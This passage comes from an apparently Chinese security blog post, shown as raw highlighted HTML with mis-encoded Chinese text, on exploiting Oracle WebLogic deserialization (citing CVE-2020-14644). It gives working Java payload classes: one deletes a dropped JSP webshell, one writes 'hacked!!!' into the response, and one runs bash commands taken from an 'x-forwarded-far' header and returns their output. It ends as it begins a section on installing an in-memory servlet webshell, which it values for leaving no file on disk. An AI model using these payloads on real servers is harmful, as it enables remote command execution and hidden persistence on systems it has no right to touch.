</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-99-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-99-28>28</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.servlet.internal.HttpConnectionHandler<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.servlet.provider.ContainerSupportProviderImpl<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.work.ExecuteThread<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.*<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>wjspx2</span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>wjspx2</span><span style=color:#f92672>(){</span>
</span></span><span style=display:flex><span>        String deploydir<span style=color:#f92672>=</span>System<span style=color:#f92672>.</span><span style=color:#a6e22e>getProperty</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;oracle.deployed.app.dir&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>.</span><span style=color:#a6e22e>reflect</span><span style=color:#f92672>.</span><span style=color:#a6e22e>Field</span> field <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        HttpConnectionHandler httpConn <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            ContainerSupportProviderImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>WlsRequestExecutor</span> gcw <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>ContainerSupportProviderImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>WlsRequestExecutor</span><span style=color:#f92672>)</span> <span style=color:#f92672>((</span>ExecuteThread<span style=color:#f92672>)</span> Thread<span style=color:#f92672>.</span><span style=color:#a6e22e>currentThread</span><span style=color:#f92672>()).</span><span style=color:#a6e22e>getCurrentWork</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            field <span style=color:#f92672>=</span> gcw<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;connectionHandler&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            field<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            httpConn <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>HttpConnectionHandler<span style=color:#f92672>)</span> field<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>gcw<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            String temppath <span style=color:#f92672>=</span> httpConn<span style=color:#f92672>.</span><span style=color:#a6e22e>getServletRequest</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getContext</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getTempPath</span><span style=color:#f92672>().</span><span style=color:#a6e22e>toString</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//            File jsppath=new File(new File(deploydir,temppath),&#34;/war/pages/css/clickjackingScriptbakup_9ik97.jsp&#34;);
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            File jsppath<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> File<span style=color:#f92672>(</span><span style=color:#66d9ef>new</span> File<span style=color:#f92672>(</span>deploydir<span style=color:#f92672>,</span>temppath<span style=color:#f92672>),</span><span style=color:#e6db74>&#34;/war/pages/css/hineo.jsp&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            jsppath<span style=color:#f92672>.</span><span style=color:#a6e22e>delete</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>Exception e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException<span style=color:#f92672>(</span>e<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=servjavaé€šè¿‡servletå›æ˜¾å‘½ä»¤æ‰§è¡Œçš„ç»“æœ>serv.javaï¼šé€šè¿‡servletå›æ˜¾å‘½ä»¤æ‰§è¡Œçš„ç»“æœ<a hidden class=anchor aria-hidden=true href=#servjavaé€šè¿‡servletå›æ˜¾å‘½ä»¤æ‰§è¡Œçš„ç»“æœ>#</a></h2><h3 id=æ¢ç´¢è¿‡ç¨‹-2>æ¢ç´¢è¿‡ç¨‹<a hidden class=anchor aria-hidden=true href=#æ¢ç´¢è¿‡ç¨‹-2>#</a></h3><p>å°è¯•é€šè¿‡å½“å‰çº¿ç¨‹è·å–åˆ°requestå¯¹è±¡ï¼Œå‘å…¶ä¸­å†™å†…å®¹æ¥æ˜¾ç¤ºå‘½ä»¤æ‰§è¡Œçš„ç»“æœï¼Œä¹Ÿæ­£æ˜¯åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­æƒ³åˆ°äº†wjsp2.javaçš„è§£æ³•ã€‚</p><p>å°è¯•ç›´æ¥è·å–connectionHandleræ—¶æç¤ºç§æœ‰å±æ€§æ— æ³•ç›´æ¥è·å–</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-100-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-100-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-100-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-100-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-100-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-100-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-100-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-100-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-100-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-100-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-100-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-100-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-100-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-100-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-100-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-100-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-100-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-100-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-100-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-100-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-100-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-100-11>11</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.servlet.provider.ContainerSupportProviderImpl<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.work.ExecuteThread<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.ByteArrayInputStream<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>mems</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>mems</span><span style=color:#f92672>(){</span>
</span></span><span style=display:flex><span><span style=color:#f92672>((</span>ContainerSupportProviderImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>WlsRequestExecutor</span><span style=color:#f92672>)((</span>ExecuteThread<span style=color:#f92672>)</span> Thread<span style=color:#f92672>.</span><span style=color:#a6e22e>currentThread</span><span style=color:#f92672>()).</span><span style=color:#a6e22e>getCurrentWork</span><span style=color:#f92672>()).</span><span style=color:#a6e22e>connectionHandler</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getServletRequest</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getResponse</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getServletOutputStream</span><span style=color:#f92672>().</span><span style=color:#a6e22e>writeStream</span><span style=color:#f92672>(</span><span style=color:#66d9ef>new</span> ByteArrayInputStream<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;hacked!!!&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getBytes</span><span style=color:#f92672>()));</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=image-20220701143006110.png alt=image-20220701143006110></p><p>ä¼šæŠ¥é”™</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-101-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-101-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>java: connectionHandler has private access in weblogic.servlet.provider.ContainerSupportProviderImpl.WlsRequestExecutor
</span></span></code></pre></td></tr></table></div></div><p>äºæ˜¯å°è¯•é€šè¿‡åå°„æ¥è°ƒç”¨ç§æœ‰å˜é‡ï¼ŒæˆåŠŸè·å–åˆ°requestå¯¹è±¡ã€‚</p><p>å‚è€ƒï¼š</p><p><a href=https://xz.aliyun.com/t/7740#toc-4>https://xz.aliyun.com/t/7740#toc-4</a></p><p><a href=https://paper.seebug.org/1442/#1-cve-2020-14644>https://paper.seebug.org/1442/#1-cve-2020-14644</a></p><h3 id=ä¼˜ç¼ºç‚¹-3>ä¼˜ç¼ºç‚¹<a hidden class=anchor aria-hidden=true href=#ä¼˜ç¼ºç‚¹-3>#</a></h3><p>ä¼˜ç‚¹</p><ol><li>æ²¡æœ‰æ–‡ä»¶è½åœ°</li><li>ç³»ç»Ÿæ— æ®‹ç•™ï¼Œä¸éœ€è¦å¸è½½è¿‡ç¨‹</li></ol><p>ç¼ºç‚¹</p><ol><li>æ¯æ¬¡æ‰§è¡Œå‘½ä»¤éƒ½è¦è§¦å‘ä¸€æ¬¡ååºåˆ—åŒ–ï¼ŒåŠ¨é™å¤§ï¼Œä¸ä¼˜é›…</li><li>å­˜åœ¨ç¯å¢ƒä¸ç¡®å®šæ€§ï¼Œå¯èƒ½å› ä¸ºä¸åŒç‰ˆæœ¬ä»£ç å†™æ³•ä¸åŒå¯¼è‡´è·å–ä¸åˆ°requestå¯¹è±¡</li></ol><h3 id=æœ€ç»ˆæ•ˆæœ-5>æœ€ç»ˆæ•ˆæœ<a hidden class=anchor aria-hidden=true href=#æœ€ç»ˆæ•ˆæœ-5>#</a></h3><p><img loading=lazy src=image-20220701150247898.png alt=image-20220701150247898></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-102-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-102-29>29</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.servlet.internal.HttpConnectionHandler<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.servlet.internal.ServletOutputStreamImpl<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.servlet.internal.ServletResponseImpl<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.servlet.provider.ContainerSupportProviderImpl<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.work.ExecuteThread<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>serv</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>serv</span><span style=color:#f92672>(){</span>
</span></span><span style=display:flex><span>        java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>.</span><span style=color:#a6e22e>reflect</span><span style=color:#f92672>.</span><span style=color:#a6e22e>Field</span> field <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        HttpConnectionHandler httpConn <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        ContainerSupportProviderImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>WlsRequestExecutor</span> gcw <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>ContainerSupportProviderImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>WlsRequestExecutor</span><span style=color:#f92672>)</span> <span style=color:#f92672>((</span>ExecuteThread<span style=color:#f92672>)</span> Thread<span style=color:#f92672>.</span><span style=color:#a6e22e>currentThread</span><span style=color:#f92672>()).</span><span style=color:#a6e22e>getCurrentWork</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            field <span style=color:#f92672>=</span> gcw<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;connectionHandler&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            field<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            httpConn <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>HttpConnectionHandler<span style=color:#f92672>)</span> field<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>gcw<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            ServletResponseImpl resp <span style=color:#f92672>=</span> httpConn<span style=color:#f92672>.</span><span style=color:#a6e22e>getServletRequest</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getResponse</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            String ncmd<span style=color:#f92672>=</span>httpConn<span style=color:#f92672>.</span><span style=color:#a6e22e>getServletRequest</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getHeader</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;x-forwarded-far&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            resp<span style=color:#f92672>.</span><span style=color:#a6e22e>getWriter</span><span style=color:#f92672>().</span><span style=color:#a6e22e>write</span><span style=color:#f92672>(</span>ncmd<span style=color:#f92672>+</span><span style=color:#e6db74>&#34;\n===========\n&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            String<span style=color:#f92672>[]</span> cmdarray<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> String<span style=color:#f92672>[]{</span><span style=color:#e6db74>&#34;bash&#34;</span><span style=color:#f92672>,</span><span style=color:#e6db74>&#34;-c&#34;</span><span style=color:#f92672>,</span>ncmd<span style=color:#f92672>};</span>
</span></span><span style=display:flex><span>            ServletOutputStreamImpl sos <span style=color:#f92672>=</span> resp<span style=color:#f92672>.</span><span style=color:#a6e22e>getServletOutputStream</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            sos<span style=color:#f92672>.</span><span style=color:#a6e22e>writeStream</span><span style=color:#f92672>(</span>Runtime<span style=color:#f92672>.</span><span style=color:#a6e22e>getRuntime</span><span style=color:#f92672>().</span><span style=color:#a6e22e>exec</span><span style=color:#f92672>(</span>cmdarray<span style=color:#f92672>).</span><span style=color:#a6e22e>getInputStream</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>            sos<span style=color:#f92672>.</span><span style=color:#a6e22e>flush</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            resp<span style=color:#f92672>.</span><span style=color:#a6e22e>getWriter</span><span style=color:#f92672>().</span><span style=color:#a6e22e>write</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;\n===========\n&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>Exception e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException<span style=color:#f92672>(</span>e<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=memsijavaå®‰è£…å†…å­˜é©¬>memsi.javaï¼šå®‰è£…å†…å­˜é©¬<a hidden class=anchor aria-hidden=true href=#memsijavaå®‰è£…å†…å­˜é©¬>#</a></h2><h3 id=æ¢ç´¢è¿‡ç¨‹-3>æ¢ç´¢è¿‡ç¨‹<a hidden class=anchor aria-hidden=true href=#æ¢ç´¢è¿‡ç¨‹-3>#</a></h3><p>è¿™é‡Œå°è¯•ä½¿ç”¨servletå†…å­˜é©¬ï¼Œæœ¬è´¨ä¸Šæ˜¯å…ˆè·å–åˆ°servlet mappingï¼Œè‡ªå®šä¹‰ä¸€ä¸ªæ‰©å±•äº† <code>javax.servlet.http.HttpServlet</code> çš„ç±»ï¼Œç„¶åå¾€mappingä¸­æ·»åŠ è‡ªå·±å®šä¹‰çš„è·¯ç”±å’Œå¤„ç†è¿™ä¸ªè·¯ç”±çš„å¯¹è±¡ã€‚è¿™æ•´ä¸ªè¿‡ç¨‹éƒ½è¦é€šè¿‡ååºåˆ—åŒ–çš„æ“ä½œæ¥å®ç°ã€‚</p><h4 id=è·å–servlet-mapping>è·å–servlet mapping<a hidden class=anchor aria-hidden=true href=#è·å–servlet-mapping>#</a></h4><p>é¦–å…ˆåœ¨åˆé€‚çš„åœ°æ–¹ï¼ˆæ¯”å¦‚ <code>com.tangosol.internal.util.invoke.RemotableSupport#realize</code>ï¼‰ä¸‹æ–­ç‚¹ï¼Œå°è¯•è·å–servlet mapping</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-103-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-103-1> 1</a>
